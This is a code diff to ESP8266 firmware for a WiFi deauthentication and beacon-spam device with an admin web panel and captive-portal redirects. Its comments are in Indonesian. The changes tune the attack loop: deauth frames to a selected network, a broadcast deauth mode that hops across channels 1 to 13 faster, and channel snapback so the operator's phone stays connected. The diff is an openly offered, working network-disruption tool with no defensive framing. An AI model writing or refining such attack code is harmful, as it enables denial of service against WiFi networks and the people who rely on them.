@@ -54,7 +54,7 @@ void spamBeacon() {
   }
 }
 
-// ================= UI ADMIN =================
+// ================= UI ADMIN (INDEX_HTML UTUH) =================
 const char INDEX_HTML[] PROGMEM = R"rawliteral(
 <!DOCTYPE html><html lang="id"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no"><title>GMpro87 - Admin Panel</title>
 <style>
@@ -155,6 +155,7 @@ void setup() {
   WiFi.softAPdisconnect(true);
   WiFi.mode(WIFI_AP_STA);
   
+  // FIXED: Admin Channel dipaksa 1 biar sinkron
   WiFi.softAP(admin_ssid.c_str(), admin_pass.c_str(), 1); 
   admin_ch = 1;
   
@@ -169,10 +170,9 @@ void setup() {
     server.send(200, "text/html", html);
   });
 
-  // Handler Captive Portal buat Android & iOS
+  // Handler Captive Portal (PENTING BIAR GAK MENTAL)
   server.on("/generate_204", []() { server.sendHeader("Location", "/"); server.send(302); });
   server.on("/redirect", []() { server.sendHeader("Location", "/"); server.send(302); });
-  server.on("/hotspot-detect.html", []() { server.sendHeader("Location", "/"); server.send(302); });
 
   server.on("/scan", []() { 
     wifi_promiscuous_enable(0);
@@ -219,20 +219,20 @@ void loop() {
   if (deauth_running && selected_bssid != "") {
     wifi_set_channel(target_ch);
     sendDeauth(selected_bssid);
-    yield();
+    // TRICK STABLE: Wajib balik ke admin_ch buat ngelayanin HP lu
     wifi_set_channel(admin_ch); 
+    delay(1); // Kasih nafas radio
   }
   
   if (rusuh_mode || attack_all) {
     static unsigned long last_hop = 0;
-    if (millis() - last_hop > 150) { 
+    if (millis() - last_hop > 100) { 
       static uint8_t ch = 1;
       wifi_set_channel(ch);
       sendDeauth("FF:FF:FF:FF:FF:FF");
       ch++; if (ch > 13) ch = 1;
+      wifi_set_channel(admin_ch); // Snapback ke admin
       last_hop = millis();
-      yield();
-      wifi_set_channel(admin_ch); 
     }
   }
   
